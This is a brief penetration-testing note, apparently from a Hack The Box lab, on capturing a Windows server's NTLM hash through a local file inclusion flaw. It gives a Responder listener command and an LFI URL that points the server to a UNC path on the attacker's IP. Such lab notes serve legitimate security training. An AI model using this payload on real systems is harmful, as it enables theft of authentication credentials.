
When there is an website running and LFI is active and the Host is Windows, we can potentially capture an NTLM Hash, because we can trick the windows server to treat our local machine as an network file share. When the server tries to connect over SMB, Windows automatically sents over its encrypted NTLM Login Credentials to authenticate, which then our responder will capture.

1. Startup Responder on local machine

```
responder -I tun0
```

2. Execute reverse call to responder through LFI (local machine)

```
http://school.flight.htb/index.php?view=//10.10.15.9/test
```
